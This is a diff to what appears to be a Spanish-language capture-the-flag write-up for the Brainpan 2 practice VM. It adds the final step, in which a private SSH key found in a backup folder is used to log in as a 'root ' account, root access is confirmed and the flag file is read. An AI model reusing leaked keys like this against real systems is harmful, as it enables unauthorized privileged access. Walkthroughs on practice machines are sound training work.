@@ -301,7 +301,40 @@ python -c 'import os,pty;os.setresuid(1001,1001,1001);pty.spawn("/bin/bash");'
 
 <img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain14.jpg" width="80%"></img>
 
+> Utilizamos el archivo ID_RSA de la carpeta backup para conectarnos.
+```
+puck@brainpan2:/home/puck/.backup$ ssh -l "root " brainpan2 -i ./.ssh/id_rsa -p2222
+<backup$ ssh -l "root " brainpan2 -i ./.ssh/id_rsa -p2222                    
+Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Feb 13 21:03:24 2021 from localhost
+root @brainpan2:~# id
+id
+uid=0(root ) gid=0(root ) groups=0(root )
+root @brainpan2:~# cat /root/flag.txt
+cat /root/flag.txt
+
+                          !!! CONGRATULATIONS !!!
+
+                 You've completed the Brainpan 2 challenge! 
+                 Or have you...? 
+
+                 Yes, you have! Pat yourself on the back. :-)
+
+                 Questions, comments, suggestions for new VM
+                 challenges? Let me know! 
 
 
+                 Twitter: @superkojiman
+                 Email  : contact@techorganic.com
+                 Web    : http://www.techorganic.com
+
+```
 
 
